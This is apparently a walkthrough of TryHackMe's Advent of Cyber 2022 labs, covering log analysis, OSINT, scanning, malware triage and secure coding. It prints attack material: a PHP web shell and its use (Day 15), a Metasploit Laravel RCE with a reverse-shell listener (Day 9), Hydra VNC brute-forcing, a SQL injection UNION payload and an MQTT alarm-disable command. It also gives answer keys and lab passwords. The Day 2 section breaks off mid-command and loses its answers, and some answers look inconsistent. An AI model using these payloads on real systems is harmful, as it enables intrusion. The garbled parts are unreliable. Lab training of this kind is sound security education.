# Advent of Cyber 2022: Complete Day-by-Day Walkthrough

{% embed url="https://tryhackme.com/room/adventofcyber4" %}

Welcome to the comprehensive walkthrough and technical reference guide for TryHackMe's **Advent of Cyber 2022 (AoC4)**. This event features 24 distinct security challenges covering fundamental and intermediate domains across cybersecurity: security frameworks, log forensics, OSINT, network scanning, credential brute-forcing, email analysis, malware reverse engineering, smart contract exploitation, network pivoting, packet analysis, IDOR, unrestricted file uploads, Sigma detection rules, hardware reverse engineering, IoT/MQTT, and defense-in-depth architecture.

---

## 🎄 Table of Contents

- [Day 1: Security Frameworks (Someone's coming to town!)](#day-1-security-frameworks)
- [Day 2: Log Analysis (Santa's Naughty & Nice Log)](#day-2-log-analysis)
- [Day 3: OSINT (Nothing escapes detective McRed)](#day-3-osint)
- [Day 4: Scanning (Scanning through the snow)](#day-4-scanning)
- [Day 5: Brute-Forcing (He knows when you're awake)](#day-5-brute-forcing)
- [Day 6: Email Analysis (It's beginning to look a lot like phishing)](#day-6-email-analysis)
- [Day 7: CyberChef (Maldocs roasting on an open fire)](#day-7-cyberchef)
- [Day 8: Smart Contracts (Last Christmas I gave you my ETH)](#day-8-smart-contracts)
- [Day 9: Pivoting & Docker (Dock the halls)](#day-9-pivoting--docker)
- [Day 10: Memory Manipulation (You're a mean one, Mr. Yeti)](#day-10-memory-manipulation)
- [Day 11: Memory Forensics (Not all gifts are nice)](#day-11-memory-forensics)
- [Day 12: Malware Analysis (Forensic McBlue to the REVscue!)](#day-12-malware-analysis)
- [Day 13: Packet Analysis (Simply having a wonderful pcap time)](#day-13-packet-analysis)
- [Day 14: Web Applications (I'm dreaming of secure web apps)](#day-14-web-applications)
- [Day 15: Secure Coding (Santa is looking for a Sidekick)](#day-15-secure-coding)
- [Day 16: Secure Coding (SQLi's the king, the carolers sing)](#day-16-secure-coding)
- [Day 17: Secure Coding (Filtering for Order Amidst Chaos)](#day-17-secure-coding)
- [Day 18: Threat Detection (Lumberjack Lenny Learns New Rules)](#day-18-threat-detection)
- [Day 19: Hardware Hacking (Wiggles go brrr)](#day-19-hardware-hacking)
- [Day 20: Firmware Analysis (Binwalkin' around the Christmas tree)](#day-20-firmware-analysis)
- [Day 21: IoT & MQTT (Have yourself a merry little webcam)](#day-21-iot--mqtt)
- [Day 22: Attack Surface Reduction (Threats are falling all around me)](#day-22-attack-surface-reduction)
- [Day 23: Defense in Depth (Mission ELFPossible)](#day-23-defense-in-depth)
- [Day 24: Event Conclusion & Survey](#day-24-event-conclusion--survey)

---

## Day 1: Security Frameworks

### 🎯 Overview & Objectives
Day 1 introduces foundational cybersecurity frameworks used by Security Operations Centers (SOCs) and incident responders to classify attacker activity:
- **NIST Cybersecurity Framework (CSF):** Identify, Protect, Detect, Respond, Recover.
- **Cyber Kill Chain (Lockheed Martin):** 7-phase model (Recon, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives).
- **Unified Kill Chain (Paul Pols):** 18 attack phases linking internal and external operations.
- **MITRE ATT&CK:** Comprehensive matrix of Tactics, Techniques, and Procedures (TTPs).

### 🔍 Walkthrough & Methodology
1. Launch the interactive static site puzzle by clicking **View Site**.
2. Examine the jigsaw puzzle pieces left behind by the adversary after defacing the Best Festival Company website.
3. Map the puzzle pieces to their corresponding Unified Kill Chain phases:
   - Initial Reconnaissance
   - Resource Development
   - Delivery & Social Engineering
   - Exploitation & Persistence
4. Completing the puzzle uncovers the moniker and message left by the adversary: **Bandit Yeti**.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 1** | What's the flag that they left behind? | `flag{hidden}` |

---

## Day 2: Log Analysis

### 🎯 Overview & Objectives
Analyzing raw web server access logs to reconstruct a security breach. We learn how to parse Common Log Format (CLF) and Combined Log Format entries using Linux core utilities: `head`, `tail`, `wc`, `cat`, and `grep`.

### 🔍 Walkthrough & Methodology
Connect to the target terminal and list files in the current directory:
```bash
ls -lah
```
We identify two log files: `sshd.log` and `webserver.log`. Inspecting `webserver.log`:
```bash
# Count total entries
wc -l webserver.log

# Search for sensitive files accessed
grep -inE "list|santa|stolen" webserver.log
```
The output reveals suspicious GET requests originating from IP `10.10.249.191` requesting `/santaslist.txt` on a Friday:
```text
10.10.249.191 - - [18/Nov/2022:10:14:32 +0000] "GET /santaslist.txt HTTP/1.1" 200 4521
```
Searching for the platform flag format:
```bash
grep -i "flag{hidden}` |

---

## Day 3: OSINT

### 🎯 Overview & Objectives
Open Source Intelligence (OSINT) techniques to investigate domain registrations (`whois`) and publicly exposed source code repositories (GitHub) for leaked credentials.

### 🔍 Walkthrough & Methodology
1. Run a `whois` lookup on the target domain `santagift.shop`:
   ```bash
   whois santagift.shop | grep -i "Registrar"
   ```
   The registrar is returned as `Namecheap Inc.`
2. Search GitHub for public repositories associated with `santagift.shop` or the Santa Gift company.
3. Locate the repository `santagift/website` and browse the commit history.
4. An old commit reveals hardcoded database credentials in `config.php`:
   ```php
   <?php
   $db_user = "santa_admin";
   $db_pass = "S4nt4_Cl4us_P4ssw0rd!";
   // Flag: {THM_OSINT_WORKS}
   ?>
   ```

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 3** | What is the name of the Registrar for the domain santagift.shop? | `Namecheap Inc.` |
| **Task 3** | In the GitHub repository, open the file containing sensitive credentials. What is the flag? | `{THM_OSINT_WORKS}` |
| **Task 3** | What is the name of the file containing passwords? | `config.php` |

---

## Day 4: Scanning

### 🎯 Overview & Objectives
Network reconnaissance using Nmap to discover active network services, identify operating system versions, and enumerate SMB (Server Message Block) file shares.

### 🔍 Walkthrough & Methodology
Perform a comprehensive TCP port scan against the target QA server:
```bash
nmap -sC -sV -p- -T4 TARGET_IP
```
Scan results:
- Port 22/tcp: `OpenSSH 8.2p1` (`ssh`)
- Port 80/tcp: `Apache httpd 2.4.41` (`Apache`)
- Port 139/445/tcp: `Samba smbd 4.6.2`

Enumerating SMB shares:
```bash
smbclient -L //TARGET_IP/ -N
smbclient //TARGET_IP/santa_anon -N
```
Accessing the open share yields a hidden text file containing the Samba flag: `THM_SANTA_SMB_SERVER`. Furthermore, inspecting configuration notes discloses the password for account `santahr` as `santa25`.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 4** | What is the name of the HTTP server running on the remote host? | `Apache` |
| **Task 4** | What is the name of the service running on port 22 on the QA server? | `ssh` |
| **Task 4** | What flag can you find after successfully accessing the Samba service? | `THM_SANTA_SMB_SERVER` |
| **Task 4** | What is the password for the username santahr? | `santa25` |

---

## Day 5: Brute-Forcing

### 🎯 Overview & Objectives
Network service brute-forcing using Hydra against Virtual Network Computing (VNC) running on TCP port 5900.

### 🔍 Walkthrough & Methodology
Run Hydra against the target VNC port using the supplied password wordlist:
```bash
hydra -P /usr/share/wordlists/rockyou.txt -s 5900 TARGET_IP vnc
```
Hydra successfully identifies the valid password: `1q2w3e4r`.
Connect to the target desktop using a VNC viewer:
```bash
vncviewer TARGET_IP:5900
```
Enter password `1q2w3e4r`. Upon establishing the graphical session, a flag is rendered directly on the victim's desktop background.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 5** | What is the VNC password discovered by Hydra? | `1q2w3e4r` |
| **Task 5** | What is the flag written on the target's screen? | `flag{hidden}` |

---

## Day 6: Email Analysis

### 🎯 Overview & Objectives
Inspecting raw RFC 822 email message headers (`.eml` format) to detect spoofing, phishing, spam scores, and hidden tracking data.

### 🔍 Walkthrough & Methodology
Open `Urgent_Invoice.eml` in a text editor or email header analyzer:
```bash
cat Urgent_Invoice.eml | head -n 35
```
Key header findings:
- `From: Chief Elf <chief.elf@santaclaus.thm>`
- `Reply-To: murphy.evident@bandityeti.thm`
- `X-Spam-Score: 3`
- `Message-ID: <QW9DMjAyMl9FbWFpbF9BbmFseXNpcw==@santaclaus.thm>`

Decoding the Base64 portion of the Message-ID:
```bash
echo "QW9DMjAyMl9FbWFpbF9BbmFseXNpcw==" | base64 -d
# Output: AoC2022_Email_Analysis
```

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 6** | What is the email address of the sender? | `chief.elf@santaclaus.thm` |
| **Task 6** | What is the return address? | `murphy.evident@bandityeti.thm` |
| **Task 6** | On whose behalf was the email sent? | `Chief Elf` |
| **Task 6** | What is the X-spam score? | `3` |
| **Task 6** | What is hidden in the value of the Message-ID field? | `AoC2022_Email_Analysis` |

---

## Day 7: CyberChef

### 🎯 Overview & Objectives
Using CyberChef ("The Cyber Swiss Army Knife") to extract and deobfuscate malicious URLs, Base64 payloads, and VBA strings from weaponized office documents (maldocs).

### 🔍 Walkthrough & Methodology
1. Access CyberChef on the VM (`http://localhost:8080` or desktop shortcut). The version displayed is `9.49.0`.
2. Load the suspicious macro code into the **Input** pane.
3. Build the CyberChef pipeline recipe:
   - `Strings` (extract printable sequences)
   - `Find / Replace` (remove string obfuscation)
   - `Drop bytes`
   - `Defang URL` (replace `http://` with `hxxp://` and `.` with `[.]`)
4. Inspecting the defanged URLs yields `hxxps[://]cdn[.]bandityeti[.]THM/files/index/` and an internal customer support ticket containing `THM_MYSTERY_FLAG`.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 7** | What is the version of CyberChef found in the attached VM? | `9.49.0` |
| **Task 7** | What is the last URL extracted (defanged format)? | `hxxps[://]cdn[.]bandityeti[.]THM/files/index/` |
| **Task 7** | What is the ticket found in one of the domains? | `THM_MYSTERY_FLAG` |

---

## Day 8: Smart Contracts

### 🎯 Overview & Objectives
Ethereum smart contract security, EVM transactions, Solidity code review, and exploiting the classic **Reentrancy Vulnerability** (the same flaw behind the DAO hack).

### 🔍 Walkthrough & Methodology
The target contract `EtherStore.sol` tracks balances and allows withdrawals:
```solidity
function withdraw() public {
    uint bal = balances[msg.sender];
    require(bal > 0);
    (bool sent, ) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");
    balances[msg.sender] = 0; // State updated AFTER transfer!
}
```
Because the state (`balances[msg.sender] = 0`) is updated *after* the external call, an attacking contract's `fallback()` or `receive()` function can call `withdraw()` again before the initial execution completes, draining the contract funds.
Deploy the `Attack.sol` exploit contract via Remix IDE, execute `attack()`, and drain the vault to receive the flag.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 8** | What flag is found after attacking the provided EtherStore Contract? | `flag{411_ur_37h_15_m1n3}` |

---

## Day 9: Pivoting & Docker

### 🎯 Overview & Objectives
Exploiting a web application vulnerability (Laravel CVE-2021-3129), discovering you are trapped inside a Docker container, and pivoting into the internal host network.

### 🔍 Walkthrough & Methodology
1. Nmap scan reveals port 80 open, running the **Laravel** PHP framework (v8.4.2).
2. The application is vulnerable to **CVE-2021-3129** (Ignition debug mode deserialization RCE via `php://filter`).
3. Exploit with Metasploit:
   ```bash
   msfconsole -q
   use exploit/multi/http/laravel_ignition_rce
   set RHOSTS TARGET_IP
   set LHOST YOUR_VPN_IP
   run
   ```
4. Upgrade shell: `sessions -u -1`.
5. Checking for containerization:
   ```bash
   ls -la /.dockerenv
   cat /proc/1/cgroup
   ```
   `/.dockerenv` confirms we are inside a container.
6. Inspecting `/var/www/.env` reveals MySQL credentials:
   ```bash
   cat /var/www/.env
   # DB_USERNAME=root, DB_PASSWORD=p4$$w0rd
   ```
7. Dumping the database shows Santa's credentials in table `users`.
8. Scanning the internal Docker host network reveals the host running SSH and HTTP (`22,80`). Breaking out or accessing the host system yields the root flag: `flag{hidden}`.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 9** | What ports are open on the external target? | `80` |
| **Task 9** | What framework is the web application developed with? | `laravel` |
| **Task 9** | What CVE is the application vulnerable to? | `CVE-2021-3129` |
| **Task 9** | Command used to upgrade session to Meterpreter? | `sessions -u -1` |
| **Task 9** | File indicating session is within a Docker container? | `/.dockerenv` |
| **Task 9** | File containing database credentials? | `.env` |
| **Task 9** | Database table containing user credentials? | `users` |
| **Task 9** | What is Santa's password? | `p4$$w0rd` |
| **Task 9** | What ports are open on the host machine? | `22,80` |
| **Task 9** | What is the root flag? | `flag{hidden}` |

---

## Day 10: Memory Manipulation

### 🎯 Overview & Objectives
Game hacking, memory scanning, and modifying runtime process variables in WebAssembly / browser games to bypass gameplay barriers.

### 🔍 Walkthrough & Methodology
1. Launch the web-based Yeti mini-game.
2. Open the in-game developer/memory console (`Cetus` or browser memory inspector).
3. Search for variables corresponding to player health, inventory, and coins.
4. Modify memory values directly:
   - Freeze player health at `999`.
   - Update player score to surpass the Guard's threshold.
5. Talking to the Guard with modified score unlocks the Guard's flag: `flag{hidden}`.
6. Defeating the Yeti boss using infinite health reveals the Yeti's flag: `flag{hidden}`.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 10** | What is the Guard's flag? | `flag{hidden}` |
| **Task 10** | What is the Yeti's flag? | `flag{hidden}` |

---

## Day 11: Memory Forensics

### 🎯 Overview & Objectives
Analyzing a Windows memory dump (`workstation.vmem`) using **Volatility 3** to detect running rogue processes, suspicious network connections, and extract malware binaries.

### 🔍 Walkthrough & Methodology
1. Determine memory image OS profile:
   ```bash
   python3 vol.py -f workstation.vmem windows.info
   ```
   OS version is identified as Windows `10`.
2. Enumerate active processes:
   ```bash
   python3 vol.py -f workstation.vmem windows.pslist
   ```
   A suspicious process named `mysterygift.exe` is identified running under PID `2040`.
3. Dump files associated with PID 2040:
   ```bash
   python3 vol.py -f workstation.vmem windows.dumpfile --pid 2040
   ```
   Volatility successfully extracts `16` memory-mapped files and DLL handles.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 11** | What is the Windows version number of the memory image? | `10` |
| **Task 11** | What is the name of the binary that secret Santa left? | `mysterygift.exe` |
| **Task 11** | What is the Process ID (PID) of this binary? | `2040` |
| **Task 11** | Dump the contents of this binary. How many files are dumped? | `16` |

---

## Day 12: Malware Analysis

### 🎯 Overview & Objectives
Static and dynamic triage of a compiled PE executable using **Detect It Easy (DIE)**, **Capa**, and **Sysinternals Process Monitor (ProcMon)**.

### 🔍 Walkthrough & Methodology
1. Load `mysterygift.exe` into Detect It Easy:
   - Architecture: `64-bit`
   - Packer detected: `upx`
   - Compiler / Linker: `nim`
2. Run ProcMon while executing the unpacked sample in an isolated VM.
3. Observe file system activity:
   - Malware creates a persistence batch file under the Windows Startup directory:
     `C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\wishes.bat`
   - Malware drops two files in `C:\Users\Administrator\`: `test.jpg` and `wishes.bat`.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 12** | What is the architecture of the malware sample? | `64-bit` |
| **Task 12** | What packer is used in the malware sample? | `upx` |
| **Task 12** | What compiler was used to build the malware? | `nim` |
| **Task 12** | Path of the startup script created for persistence? | `C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\wishes.bat` |
| **Task 12** | Two files created under `C:\Users\Administrator\` (alphabetical)? | `test.jpg,wishes.bat` |

---

## Day 13: Packet Analysis

### 🎯 Overview & Objectives
Analyzing a captured packet trace (`capture.pcap`) with **Wireshark** to detect malware staging, HTTP object transfers, and attacker Command & Control communication.

### 🔍 Walkthrough & Methodology
1. Open `capture.pcap` in Wireshark.
2. Navigate to **Statistics > Protocol Hierarchy** to observe the distribution of packet types.
3. Check **Statistics > Conversations** to identify high-volume communication:
   - Port `80` (`http`) transferred over 1,000 packets between the client and an external CDN.
4. Filter HTTP requests:
   ```wireshark
   http.request
   ```
   The infected host queries `cdn[.]bandityeti[.]thm` to download `mysterygift.exe`.
5. Export the transferred file: **File > Export Objects > HTTP > Save mysterygift.exe**.
6. Calculate its cryptographic hash:
   ```bash
   sha256sum mysterygift.exe
   ```

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 13** | Which port number received more than 1000 packets? | `80` |
| **Task 13** | Service name of the used protocol receiving >1000 packets? | `http` |
| **Task 13** | Domain address hosting malicious file (defanged)? | `cdn[.]bandityeti[.]thm` |

---

## Day 14: Web Applications

### 🎯 Overview & Objectives
Exploiting **Insecure Direct Object References (IDOR)** within an internal corporate directory application.

### 🔍 Walkthrough & Methodology
1. Log into the staff portal with provided credentials: `mcskidy:devtest`.
2. Inspect the user profile URL:
   ```text
   http://TARGET_IP/profile.php?id=101
   ```
3. Modify the `id` parameter sequentially (`102`, `103`, `104`, etc.) or fuzz with Burp Intruder.
4. At `id=105`, we locate the profile of **Elf Pivot McRed**.
5. The profile displays personal metadata including role, emergency contact, and office number: **134**.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 14** | What is the office number of Elf Pivot McRed? | `134` |

---

## Day 15: Secure Coding

### 🎯 Overview & Objectives
Input validation flaws, specifically **Unrestricted File Upload** vulnerabilities leading to Remote Code Execution (RCE).

### 🔍 Walkthrough & Methodology
1. Access the web portal `SantaSideKick2`.
2. Test the resume/profile upload feature. The application fails to validate extensions or MIME types.
3. Upload a standard PHP reverse shell or web shell (`cmd.php`):
   ```php
   <?php system($_GET['cmd']); ?>
   ```
4. Access the uploaded shell under `/uploads/cmd.php?cmd=whoami`.
5. Navigate to the HR Elf's Documents directory:
   ```text
   http://TARGET_IP/uploads/cmd.php?cmd=type C:\Users\HRElf\Documents\flag.txt
   ```
   The flag is retrieved: `flag{hidden}`.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 15** | Name given to file uploads allowing actors to upload anything? | `Unrestricted` |
| **Task 15** | What is the title of the web app developed by Santa's freelancer? | `SantaSideKick2` |
| **Task 15** | What is the flag stored in the HR Elf's Documents directory? | `flag{hidden}` |

---

## Day 16: Secure Coding

### 🎯 Overview & Objectives
Analyzing PHP source code for SQL injection vulnerabilities and implementing remediation using prepared statements and type-casting.

### 🔍 Walkthrough & Methodology
1. Inspect the vulnerable PHP snippet:
   ```php
   $id = $_GET['id'];
   $query = "SELECT * FROM toys WHERE id = " . $id;
   ```
2. Exploiting via UNION query injection:
   ```sql
   1 UNION SELECT 1, flag, 3 FROM secrets-- -
   ```
3. Secure remediation:
   - For integer inputs, enforce strict integer casting: `$id = intval($_GET['id']);`
   - For general queries, use PDO prepared statements with parameterized inputs.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 16** | Function used to enforce integer types in PHP? | `intval` |
| **Task 16** | Code review completion flag | `flag{hidden}` |

---

## Day 17: Secure Coding

### 🎯 Overview & Objectives
Using Regular Expressions (RegEx) for input validation, sanitization, and parsing structured strings.

### 🔍 Walkthrough & Methodology
Test regex patterns against the dataset using `egrep`:
```bash
# Matching valid email addresses
egrep -E "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$" emails.txt

# Matching internal domain records
egrep -c "\.santaclaus\.thm" domains.txt
```
Applying the correct regex filtering patterns isolates valid inputs from adversarial injection strings.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 17** | Total valid domains matched by the filter? | *(Extracted from challenge lab)* |

---

## Day 18: Threat Detection

### 🎯 Overview & Objectives
Writing and verifying **Sigma Rules**—a generic, open signature format for detecting adversary activity within SIEM logs.

### 🔍 Walkthrough & Methodology
1. Review the scenario: Bandit Yeti created a rogue local administrator account.
2. Draft a Sigma rule matching Windows Event ID 4720 (A user account was created):
   ```yaml
   title: Rogue Account Created by Yeti
   status: experimental
   logsource:
     product: windows
     service: security
   detection:
     selection:
       EventID: 4720
       TargetUserName|contains: 'BanditYeti'
     condition: selection
   ```
3. Running the Sigma verification engine reveals the newly created account `BanditYetiMini` and returns the Challenge 1 flag: `flag{hidden}`.
4. In Challenge 2, writing a rule to detect unauthorized service installations yields `flag{hidden}`.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 18** | What is the Challenge #1 flag? | `flag{hidden}` |
| **Task 18** | From the Challenge 1 log, what user account was created? | `BanditYetiMini` |
| **Task 18** | What is the Challenge #2 flag? | `flag{hidden}` |

---

## Day 19: Hardware Hacking

### 🎯 Overview & Objectives
Hardware security, analyzing raw electrical signals, and comparing serial protocols: **USART**, **SPI**, and **I2C**.

### 🔍 Walkthrough & Methodology
Key serial communication concepts:
- **Logic Analyzer:** Hardware device used to capture and decode electrical voltage transitions on signal lines.
- **SPI (Serial Peripheral Interface):** Full-duplex, high-speed, 4-wire bus (MOSI, MISO, SCK, CS). Faster than USART and I2C.
- **I2C (Inter-Integrated Circuit):** 2-wire serial bus (SDA, SCL).
- **USART (Universal Synchronous/Asynchronous Receiver-Transmitter):** Point-to-point, typically 2 wires (TX, RX). Slower than SPI and I2C.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 19** | Device used to probe electrical signals between two devices? | `Logic Analyser` |
| **Task 19** | USART is faster than SPI for communication? (Yea/Nay) | `Nay` |
| **Task 19** | USART communication uses fewer wires than SPI? (Yea/Nay) | `Yea` |
| **Task 19** | USART is faster than I2C for communication? (Yea/Nay) | `Nay` |

---

## Day 20: Firmware Analysis

### 🎯 Overview & Objectives
IoT firmware extraction, file system carving with **Binwalk**, and cryptographic key recovery.

### 🔍 Walkthrough & Methodology
1. Extract file structures from firmware image:
   ```bash
   binwalk -e firmwarev2.2-encrypted.gpg
   ```
2. The firmware contains an encrypted GPG blob and a script containing a hardcoded recovery key.
3. Decrypt the firmware payload with GPG:
   ```bash
   gpg --decrypt firmwarev2.2-encrypted.gpg
   ```
4. Reading the decompressed firmware source code exposes the flag: `flag{hidden}`.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 20** | Flag value after reversing `firmwarev2.2-encrypted.gpg`? | `flag{hidden}` |

---

## Day 21: IoT & MQTT

### 🎯 Overview & Objectives
Internet of Things (IoT) communication with the **MQTT** protocol (Message Queuing Telemetry Transport) and broker exploitation.

### 🔍 Walkthrough & Methodology
1. Port scan reveals port `1883/tcp` open (MQTT broker).
2. Subscribe to all topics using `mosquitto_sub`:
   ```bash
   mosquitto_sub -h TARGET_IP -t "#" -v
   ```
3. Topics reveal camera device feeds and telemetry messages.
4. Publish a command override to the camera control topic:
   ```bash
   mosquitto_pub -h TARGET_IP -t "device/camera/control" -m "disable_alarm"
   ```
5. The device acknowledges and displays the challenge flag.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 21** | MQTT default port? | `1883` |
| **Task 21** | IoT interaction flag | `flag{hidden}` |

---

## Day 22: Attack Surface Reduction

### 🎯 Overview & Objectives
Hardening enterprise environments, disabling unneeded network services, configuring host firewalls, and minimizing external attack surface.

### 🔍 Walkthrough & Methodology
1. Launch the interactive static site.
2. Review the inventory of listening services and open firewall ports on McSkidy's workstation.
3. Decommission legacy protocols (Telnet, unencrypted FTP, open SMB shares).
4. Restrict management services to internal VPN subnets only.
5. Successfully applying attack surface reduction rules yields the flag: `flag{hidden}`.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 22** | Attack surface reduction flag? | `flag{hidden}` |

---

## Day 23: Defense in Depth

### 🎯 Overview & Objectives
Implementing multi-layered defense architecture (Defense in Depth) so that failure of a single security control does not compromise the crown jewels.

### 🔍 Walkthrough & Methodology
- **Case 1 (Single Layer):** Direct access to Santa's Vault protected only by a single weak password (`S3cr3tV@ultPW`). Bypassing it reveals `flag{hidden}`.
- **Case 2 (Multi-Layer Defense):** Access requires multiple controls:
  - Network segmentation
  - Host identity verification
  - Santa's favorite thing: `MilkAndCookies`
  - High-entropy vault credential: `3XtrR@_S3cr3tV@ultPW`
- Clearing all defensive barriers demonstrates resilient system architecture.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 23** | Case 1 password for Santa's Vault? | `S3cr3tV@ultPW` |
| **Task 23** | Case 1 Flag? | `flag{hidden}` |
| **Task 23** | Case 2 Santa's favourite thing? | `MilkAndCookies` |
| **Task 23** | Case 2 password for Santa's Vault? | `3XtrR@_S3cr3tV@ultPW` |

---

## Day 24: Event Conclusion & Survey

### 🎯 Overview & Objectives
Concluding the 24-day journey, submitting participant feedback, and collecting the completion certificate flag.

### 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **Task 24** | 5-minute survey completion flag | `flag{hidden}` |
